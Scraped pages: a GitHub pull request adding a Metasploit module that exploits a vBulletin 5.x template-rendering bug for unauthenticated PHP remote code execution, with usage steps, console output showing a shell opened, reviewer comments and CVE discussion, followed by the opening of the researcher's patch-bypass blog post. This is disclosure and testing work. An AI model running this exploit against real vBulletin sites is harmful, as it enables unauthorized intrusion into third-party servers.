=== Content from github.com_83e5e59a_20250119_124351.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13970)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13970)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  410](/rapid7/metasploit-framework/issues)
* [Pull requests
  37](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Vbulletin widget template rce #13970

 Merged

[smcintyre-r7](/smcintyre-r7)
merged 7 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[Zenofex:vbulletin\_widget\_template\_rce](/Zenofex/metasploit-framework/tree/vbulletin_widget_template_rce "Zenofex/metasploit-framework:vbulletin_widget_template_rce")

Aug 12, 2020

 Merged

# [Vbulletin widget template rce](#top) #13970

[smcintyre-r7](/smcintyre-r7)
merged 7 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[Zenofex:vbulletin\_widget\_template\_rce](/Zenofex/metasploit-framework/tree/vbulletin_widget_template_rce "Zenofex/metasploit-framework:vbulletin_widget_template_rce")

Aug 12, 2020

[Conversation
17](/rapid7/metasploit-framework/pull/13970)
[Commits
7](/rapid7/metasploit-framework/pull/13970/commits)
[Checks
0](/rapid7/metasploit-framework/pull/13970/checks)
[Files changed](/rapid7/metasploit-framework/pull/13970/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![Zenofex](https://avatars.githubusercontent.com/u/1518041?s=60&v=4)](/Zenofex)

Copy link

Contributor

### @Zenofex **[Zenofex](/Zenofex)** commented [Aug 9, 2020](#issue-675792817)

This pull request adds a vBulletin 5.x remote code execution module.

This module exploits a logic bug within the template rendering code of vBulletin 5.x. The module uses the vBulletin template rendering functionality to render the 'widget\_tabbedcontainer\_tab\_panel' template while also providing the 'widget\_php' argument which causes the former template to load the latter bypassing filters originally put in place to address '[CVE-2019-16759](https://github.com/advisories/GHSA-c7wq-5768-48mp "CVE-2019-16759")'. This also allows the exploit to reach an eval call with user input allowing the module to achieve PHP remote code execution on the target.

This module has been tested successfully on vBulletin version 5.6.2 on Ubuntu Linux 19.04 .

## Verification

1. Do: `use exploit/multi/http/vbulletin_widget_template_rce`
2. Do: `set RHOSTS [IP]`
3. Do: `set VHOST [HOSTNAME]`
4. Do: `set LHOST [IP]`
5. Do: `set TARGETURI [PATH]`
6. Do: `set PAYLOAD [PAYLOADNUM]`
7. Do: `run`

## Example Output

```
msf6 > use exploit/multi/http/vbulletin_widget_template_rce
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/vbulletin_widget_template_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/vbulletin_widget_template_rce) > set VHOST vb.local
VHOST => vb.local
msf6 exploit(multi/http/vbulletin_widget_template_rce) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/http/vbulletin_widget_template_rce) > set TARGETURI /
TARGETURI => /
msf6 exploit(multi/http/vbulletin_widget_template_rce) > set PAYLOAD 5
msf6 exploit(multi/http/vbulletin_widget_template_rce) > run
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Sending php/bind_perl command payload
[*] Started bind TCP handler against 127.0.0.1:4444
[*] Command shell session 1 opened (0.0.0.0:0 -> 127.0.0.1:4444) at 2020-08-09 06:29:57 -0500
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Sorry, something went wrong.

 ❤️
2
 numanturle and smcintyre-r7 reacted with heart emoji

All reactions

* ❤️
  2 reactions

 [Zenofex](/Zenofex)
added 2 commits
[August 9, 2020 17:38](#commits-pushed-661e2a6)

[![@Zenofex](https://avatars.githubusercontent.com/u/1518041?s=40&v=4)](/Zenofex)

`[Initial push of exploit and module for vbulletin_widget_template_rce …](/rapid7/metasploit-framework/pull/13970/commits/661e2a680bfea98c21787c69f1bdd0c02559ffe2 "Initial push of exploit and module for vbulletin_widget_template_rce vulnerability.")`
 …

`[661e2a6](/rapid7/metasploit-framework/pull/13970/commits/661e2a680bfea98c21787c69f1bdd0c02559ffe2)`

```
…vulnerability.
```

[![@Zenofex](https://avatars.githubusercontent.com/u/1518041?s=40&v=4)](/Zenofex)

`[A few last changes from msftidy and msftidy_docs.](/rapid7/metasploit-framework/pull/13970/commits/0dab52ef350f68cd935a850227d72c335bb54948 "A few last changes from msftidy and msftidy_docs.")`

`[0dab52e](/rapid7/metasploit-framework/pull/13970/commits/0dab52ef350f68cd935a850227d72c335bb54948)`

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=40&u=1fe0601f243e1627c6f738027d2e71b90dad989d&v=4)](/bcoles)
[bcoles](/bcoles)
added
[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
labels
[Aug 10, 2020](#event-3637455310)

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=80&v=4)](/todb-r7)

Copy link

### **[todb-r7](/todb-r7)** commented [Aug 11, 2020](#issuecomment-672003804)

| I'll tag this with a CVE ID today, and also make sure that the folks at vBulletin know about it. |
| --- |

 ❤️
1
 numanturle reacted with heart emoji

All reactions

* ❤️
  1 reaction

Sorry, something went wrong.

`[Add](/rapid7/metasploit-framework/pull/13970/commits/19618d9bd259c0f9d3b28b53b0ba41a71420430a "Add CVE-2020-7373 in the references") [CVE-2020-7373](https://github.com/advisories/GHSA-mvwh-2m72-5jm7 "CVE-2020-7373") [in the references](/rapid7/metasploit-framework/pull/13970/commits/19618d9bd259c0f9d3b28b53b0ba41a71420430a "Add CVE-2020-7373 in the references")`

`[19618d9](/rapid7/metasploit-framework/pull/13970/commits/19618d9bd259c0f9d3b28b53b0ba41a71420430a)`

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
added
the
[needs-testing-environment](/rapid7/metasploit-framework/labels/needs-testing-environment)
PRs that need community testing and/or vulnerable test targets before they're able to be landed
label
[Aug 11, 2020](#event-3644710520)

[![@rapid7](https://avatars.githubusercontent.com/u/1013671?s=40&v=4)](/rapid7)
[rapid7](/rapid7)
deleted a comment from
[label-actions](/apps/label-actions) bot
[Aug 11, 2020](#event-3644719578)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
removed
the
[needs-testing-environment](/rapid7/metasploit-framework/labels/needs-testing-environment)
PRs that need community testing and/or vulnerable test targets before they're able to be landed
label
[Aug 11, 2020](#event-3644720853)

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)
[smcintyre-r7](/smcintyre-r7)
self-assigned this
[Aug 11, 2020](#event-3645147851)

[![smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=60&v=4)](/smcintyre-r7)

**[smcintyre-r7](/smcintyre-r7)**
requested changes
[Aug 11, 2020](#pullrequestreview-465460244)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13970/files/19618d9bd259c0f9d3b28b53b0ba41a71420430a)

Copy link

Contributor

### @smcintyre-r7 **[smcintyre-r7](/smcintyre-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

This all looks good to me, great use of `AutoCheck`! It's not every day we can actually exploit the vulnerability within the check method to determine it's presence so that's awesome.

The only request I have is around some style items. There's a few things caught by rubocop when running it on the module. I'm going to tag this as "needs-linting" and there will be some instructions that come along with that.

Sorry, something went wrong.

All reactions

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)
[smcintyre-r7](/smcintyre-r7)
added
the
[needs-linting](/rapid7/metasploit-framework/labels/needs-linting)
The module needs additional work to pass our automated linting rules
label
[Aug 11, 2020](#event-3645202166)

[![@label-actions](https://avatars.githubusercontent.com/in/24092?s=80&v=4)](/apps/label-actions)

Copy link

### **[label-actions](/apps/label-actions) bot** commented [Aug 11, 2020](#issuecomment-672303964)

| Thanks for your pull request! Before this pull request can be merged, it must pass the checks of our automated linting tools.  We use Rubocop and msftidy to ensure the quality of our code. This can be ran from the root directory of Metasploit:  ``` rubocop <directory or file> tools/dev/msftidy.rb <directory or file>  ```  You can automate most of these changes with the `-a` flag:  ``` rubocop -a <directory or file>  ```  Please update your branch after these have been made, and reach out if you have any problems. |
| --- |

All reactions

Sorry, something went wrong.

[![smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=60&v=4)](/smcintyre-r7)

**[smcintyre-r7](/smcintyre-r7)**
reviewed
[Aug 11, 2020](#pullrequestreview-465462078)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13970/files/19618d9bd259c0f9d3b28b53b0ba41a71420430a)

[modules/exploits/multi/http/vbulletin\_widget\_template\_rce.rb](/rapid7/metasploit-framework/pull/13970/files/19618d9bd259c0f9d3b28b53b0ba41a71420430a#diff-8c58895463fe35333e2fba020df61c9a5f44344c9a99c0225261bfda780a77a2)
Outdated

Show resolved

Hide resolved

[![smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=60&v=4)](/smcintyre-r7)

**[smcintyre-r7](/smcintyre-r7)**
reviewed
[Aug 11, 2020](#pullrequestreview-465462460)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13970/files/19618d9bd259c0f9d3b28b53b0ba41a71420430a)

[modules/exploits/multi/http/vbulletin\_widget\_template\_rce.rb](/rapid7/metasploit-framework/pull/13970/files/19618d9bd259c0f9d3b28b53b0ba41a71420430a#diff-8c58895463fe35333e2fba020df61c9a5f44344c9a99c0225261bfda780a77a2)
Outdated

Show resolved

Hide resolved

 [Zenofex](/Zenofex)
added 3 commits
[August 11, 2020 18:38](#commits-pushed-3ef01c4)

[![@Zenofex](https://avatars.githubusercontent.com/u/1518041?s=40&v=4)](/Zenofex)

`[Ran vBulletin_widget_template_rce through rubocop, cleaned up results.](/rapid7/metasploit-framework/pull/13970/commits/3ef01c468f53a64c9c9c47bc925da9ba4f5ef39f "Ran vBulletin_widget_template_rce through rubocop, cleaned up results.")`

`[3ef01c4](/rapid7/metasploit-framework/pull/13970/commits/3ef01c468f53a64c9c9c47bc925da9ba4f5ef39f)`

[![@Zenofex](https://avatars.githubusercontent.com/u/1518041?s=40&v=4)](/Zenofex)

`[vBulletin_widget_template_rce merge](/rapid7/metasploit-framework/pull/13970/commits/8db34ea91b9326824e06b7e60af857708f964019 "vBulletin_widget_template_rce merge")`

`[8db34ea](/rapid7/metasploit-framework/pull/13970/commits/8db34ea91b9326824e06b7e60af857708f964019)`

[![@Zenofex](https://avatars.githubusercontent.com/u/1518041?s=40&v=4)](/Zenofex)

`[Fix from bad merge for vbulletin_widget_template_rce module.](/rapid7/metasploit-framework/pull/13970/commits/e334217636adc7cb661827236b498fefd2bf8736 "Fix from bad merge for vbulletin_widget_template_rce module.")`

`[e334217](/rapid7/metasploit-framework/pull/13970/commits/e334217636adc7cb661827236b498fefd2bf8736)`

[![Zenofex](https://avatars.githubusercontent.com/u/1518041?s=60&v=4)](/Zenofex)

**[Zenofex](/Zenofex)**
commented
[Aug 12, 2020](#pullrequestreview-465510500)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13970/files/e334217636adc7cb661827236b498fefd2bf8736)

Copy link

Contributor

Author

### @Zenofex **[Zenofex](/Zenofex)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Made the requested changes

Sorry, something went wrong.

All reactions

[![smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=60&v=4)](/smcintyre-r7)

**[smcintyre-r7](/smcintyre-r7)**
reviewed
[Aug 12, 2020](#pullrequestreview-465911262)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13970/files/e334217636adc7cb661827236b498fefd2bf8736)

[modules/exploits/multi/http/vbulletin\_widget\_template\_rce.rb](/rapid7/metasploit-framework/pull/13970/files/e334217636adc7cb661827236b498fefd2bf8736#diff-8c58895463fe35333e2fba020df61c9a5f44344c9a99c0225261bfda780a77a2)
Outdated

Show resolved

Hide resolved

[![@Zenofex](https://avatars.githubusercontent.com/u/1518041?s=40&v=4)](/Zenofex) [![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&v=4)](/smcintyre-r7)

`[Update modules/exploits/multi/http/vbulletin_widget_template_rce.rb](/rapid7/metasploit-framework/pull/13970/commits/0b1efd0fe9f78297982f49ae03346bfbc8b4c09b "Update modules/exploits/multi/http/vbulletin_widget_template_rce.rb

Co-authored-by: Spencer McIntyre <58950994+smcintyre-r7@users.noreply.github.com>")`
 …

`[0b1efd0](/rapid7/metasploit-framework/pull/13970/commits/0b1efd0fe9f78297982f49ae03346bfbc8b4c09b)`

```
Co-authored-by: Spencer McIntyre <58950994+smcintyre-r7@users.noreply.github.com>
```

[![smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=60&v=4)](/smcintyre-r7)

**[smcintyre-r7](/smcintyre-r7)**
approved these changes
[Aug 12, 2020](#pullrequestreview-466099312)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13970/files/0b1efd0fe9f78297982f49ae03346bfbc8b4c09b)

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)
[smcintyre-r7](/smcintyre-r7)
removed
the
[needs-linting](/rapid7/metasploit-framework/labels/needs-linting)
The module needs additional work to pass our automated linting rules
label
[Aug 12, 2020](#event-3648847603)

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=80&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)

Copy link

Contributor

### **[smcintyre-r7](/smcintyre-r7)** commented [Aug 12, 2020](#issuecomment-673025987)

| Alright, thanks for that last commit! With that in place this looks good to land. I successfully tested the PHP meterpreter payload, the CMD payload with output using the default `cmd/unix/generic` and the CMD payload for a reverse shell using `cmd/unix/reverse_php_ssl`.  Thanks [@Zenofex](https://github.com/Zenofex) ! |
| --- |

All reactions

Sorry, something went wrong.

[smcintyre-r7](/smcintyre-r7)
added a commit
that referenced
this pull request
[Aug 12, 2020](#ref-commit-0fea9ab)
[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)

`[Land](/rapid7/metasploit-framework/commit/0fea9ab5b849e8b8acac2e301cbecd01f3e6ba39 "Land #13970, Vbulletin widget template rce") [#13970](https://github.com/rapid7/metasploit-framework/pull/13970)[, Vbulletin widget template rce](/rapid7/metasploit-framework/commit/0fea9ab5b849e8b8acac2e301cbecd01f3e6ba39 "Land #13970, Vbulletin widget template rce")`

`[0fea9ab](/rapid7/metasploit-framework/commit/0fea9ab5b849e8b8acac2e301cbecd01f3e6ba39)`

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)
[smcintyre-r7](/smcintyre-r7)
merged commit [`0b1efd0`](/rapid7/metasploit-framework/commit/0b1efd0fe9f78297982f49ae03346bfbc8b4c09b)
into
rapid7:master

[Aug 12, 2020](https://github.com/rapid7/metasploit-framework/pull/13970#event-3648849998)

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=80&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)

Copy link

Contributor

### **[smcintyre-r7](/smcintyre-r7)** commented [Aug 12, 2020](#issuecomment-673027230) • edited by pbarry-r7 Loading

| Release Notes New module `exploits/multi/http/vbulletin_widget_template_rce` gains unauthenticated remote code execution on vulnerable vBulletin targets (identified as [CVE-2020-7373](https://attackerkb.com/topics/aIL9b0uOYc/cve-2020-7373?referrer=msfReleaseNotes)). Upon receiving a specially-crafted HTTP request from this module, a vulnerable target will allow arbitrary PHP code execution within the context of the application server (a non-root account). |
| --- |

All reactions

Sorry, something went wrong.

[![@cfi-gb](https://avatars.githubusercontent.com/u/34644702?s=80&v=4)](/cfi-gb)

Copy link

### **[cfi-gb](/cfi-gb)** commented [Aug 13, 2020](#issuecomment-673275243) • edited Loading

| [@todb-r7](https://github.com/todb-r7)  I'll tag this with a CVE ID today, and also make sure that the folks at vBulletin know about it.  Could you clarify where "[CVE-2020-7373](https://github.com/advisories/GHSA-mvwh-2m72-5jm7 "CVE-2020-7373")" added in [19618d9](https://github.com/rapid7/metasploit-framework/commit/19618d9bd259c0f9d3b28b53b0ba41a71420430a) is coming from? It seems <https://nvd.nist.gov/vuln/detail/CVE-2020-17496> is used for this by Mitre.Thanks |
| --- |

All reactions

Sorry, something went wrong.

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=80&v=4)](/todb-r7)

Copy link

### **[todb-r7](/todb-r7)** commented [Aug 13, 2020](#issuecomment-673627629)

| Hi [@cfi-gb](https://github.com/cfi-gb) -- this is from Rapid7's pool of CVE numbers we use to assign for research-based vulnerabilities in 3rd party products. It'll be updated in the next day or two on MITRE's side. (All unassigned CVEs will show as RESERVED by MITRE until they're populated downstream, which is why it might appear to be a MITRE thing right now.) |
| --- |

All reactions

Sorry, something went wrong.

[![@cfi-gb](https://avatars.githubusercontent.com/u/34644702?s=80&v=4)](/cfi-gb)

Copy link

### **[cfi-gb](/cfi-gb)** commented [Aug 14, 2020](#issuecomment-673886415) • edited Loading

| Thanks for clarification. Then it seems two CVEs ([CVE-2020-7373](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7373) which is currently in RESERVED state and [CVE-2020-17496](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17496) which is already published) got assigned for the very same vulnerability and one might need to be rejected to avoid duplicates. |
| --- |

All reactions

Sorry, something went wrong.

 [![@Zenofex](https://avatars.githubusercontent.com/u/1518041?s=40&u=60e930b85792407fbf92f71b77c1f9cb94e4827c&v=4)](/Zenofex)
[Zenofex](/Zenofex)
deleted the
vbulletin\_widget\_template\_rce

branch
[August 14, 2020 10:36](#event-3655715560)

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=80&v=4)](/todb-r7)

Copy link

### **[todb-r7](/todb-r7)** commented [Aug 14, 2020](#issuecomment-674072668)

| Well, heck. Thanks [@cfi-gb](https://github.com/cfi-gb) . Do you know from whence [CVE-2020-17496](https://github.com/advisories/GHSA-j77p-6wx9-cjqq "CVE-2020-17496") came from? It was issued by MITRE, so I'm curious who the go-getter was who requested the number. :)  In the meantime, I'll fix up the module to use that, rather than have two. |
| --- |

 👍
1
 cfi-gb reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@cfi-gb](https://avatars.githubusercontent.com/u/34644702?s=80&v=4)](/cfi-gb)

Copy link

### **[cfi-gb](/cfi-gb)** commented [Aug 14, 2020](#issuecomment-674080824)

| Unfortunately i don't know there the second is coming from, hoped to get this info here :-)  Ref for the change of the CVE to the one issued by MITRE: [#13997](https://github.com/rapid7/metasploit-framework/pull/13997) |
| --- |

All reactions

Sorry, something went wrong.

[![@pbarry-r7](https://avatars.githubusercontent.com/u/19912177?s=40&u=0b023c30367f79db5b30a53c18484dbec6ac9510&v=4)](/pbarry-r7)
[pbarry-r7](/pbarry-r7)
added
the
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
label
[Aug 18, 2020](#event-3667330188)

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=40&v=4)](/todb-r7)
[todb-r7](/todb-r7)
mentioned this pull request
[Oct 29, 2020](#ref-pullrequest-732511895)

[Rectify RBP on CVE-2020-7373
rapid7/cvelist#38](/rapid7/cvelist/pull/38)
 Merged

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13970)

Reviewers

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&v=4)](/smcintyre-r7) [smcintyre-r7](/smcintyre-r7)

smcintyre-r7 approved these changes

Assignees

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&v=4)](/smcintyre-r7) [smcintyre-r7](/smcintyre-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

7 participants

[![@Zenofex](https://avatars.githubusercontent.com/u/1518041?s=52&v=4)](/Zenofex) [![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=52&v=4)](/todb-r7) [![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=52&v=4)](/smcintyre-r7) [![@cfi-gb](https://avatars.githubusercontent.com/u/34644702?s=52&v=4)](/cfi-gb) [![@bcoles](https://avatars.githubusercontent.com/u/434827?s=52&v=4)](/bcoles) [![@pbarry-r7](https://avatars.githubusercontent.com/u/19912177?s=52&v=4)](/pbarry-r7) [![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=52&v=4)](/gwillcox-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from blog.exploitee.rs_41fa1b5d_20250119_124348.html ===

#

* [Home](https://blog.exploitee.rs)
* [Wiki](http://exploitee.rs)
* [Forum](http://forum.exploitee.rs)

# [Exploiting vBulletin: “A Tale of a Patch Fail”](/2020/exploiting-vbulletin-a-tale-of-patch-fail/)

**Posted:** August 9th, 2020 | **Author:** [zenofex](/author/zenofex/ "Posts by zenofex") | **Filed under:** [Uncategorized](/category/uncategorized/) | [1 Comment »](/2020/exploiting-vbulletin-a-tale-of-patch-fail/#comments)

On September 23, 2019 [an undisclosed researcher released a bug which allowed for PHP remote code execution in vBulletin 5.0 through 5.4](https://seclists.org/fulldisclosure/2019/Sep/31). This bug (CVE-2019-16759) was labeled as a ‘bugdoor’ because of its simplicity by a [popular vulnerability broker](https://twitter.com/cbekrar/status/1176803541047861249) and was marked with a [CVSS 3.x score of 9.8](https://nvd.nist.gov/vuln/detail/CVE-2019-16759) giving it a critical rating.

Today, we’re going to talk about how the patch that was supplied for the vulnerability was inadequate in blocking exploitation, show how to bypass the resulting fix, and releasing a bash one-liner resulting in remote code execution in the latest vBulletin software.

## CVE-2019-16759

The vulnerability mentioned above was later formally labeled “CVE-2019-16759” and a patch was issued on September 25, 2019. Although the patch was provided in just under 3 days, the patch seemed, at the time, to fix the proof of concept exploit provided by the un-named finder.

The patch(s) consisted of three main changes provided in 2 sets of patches, the first being shown below.

